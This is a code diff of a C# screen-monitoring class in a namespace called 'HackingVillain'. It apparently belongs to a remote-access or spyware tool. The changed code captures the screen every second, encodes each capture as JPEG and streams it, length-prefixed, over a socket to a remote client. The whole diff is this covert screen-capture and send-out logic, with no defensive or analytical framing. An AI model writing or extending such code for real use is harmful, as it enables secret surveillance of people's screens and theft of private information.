@@ -14,29 +14,57 @@ namespace HackingVillain
 {
     public class ScreenMonitor
     {
-        public bool IsWatching = true;
-
         ISocket _client;
-        public ScreenMonitor(ISocket client)
+        Thread t;
+        public ScreenMonitor(ISocket sock)
         {
-            _client = client;
-            Thread t = new Thread(Update);
+            _client = sock;
+
+            t = new Thread(() =>
+            {
+                while(true)
+                {
+                    Send();
+                    Thread.Sleep(1000);
+                }
+            });
+        }
+
+        ~ScreenMonitor()
+        {
+            Stop();
+        }
+
+        public void Start()
+        {
             t.Start();
         }
 
-        public void Update()
+        public void Stop()
         {
-            while (true)
+            t.Abort();
+        }
+
+        public void Send()
+        {
+            SendScreen(_client);
+        }
+
+        public static void SendScreen(ISocket client)
+        {
+            var img = CaptureScreen();
+            using (var ms = new MemoryStream())
             {
-                var img = CaptureScreen();
-                using (var ms = new MemoryStream())
-                {
-                    img.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
-                    Buffer buf = Buffer.New();
-                    Buffer.Add(buf, ms.ToArray());
-                    AweSock.SendMessage(_client, buf);
-                }
-                Thread.Sleep(2000);
+                img.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
+                var bytes = ms.ToArray();
+                Buffer buf = Buffer.New();
+                Buffer.Add(buf, bytes.Length);
+                Buffer.FinalizeBuffer(buf);
+                AweSock.SendMessage(client, buf);
+                var buff = Buffer.New(bytes.Length);
+                Buffer.Add(buff, bytes);
+                Buffer.FinalizeBuffer(buff);
+                AweSock.SendMessage(client, buff);
             }
         }
 
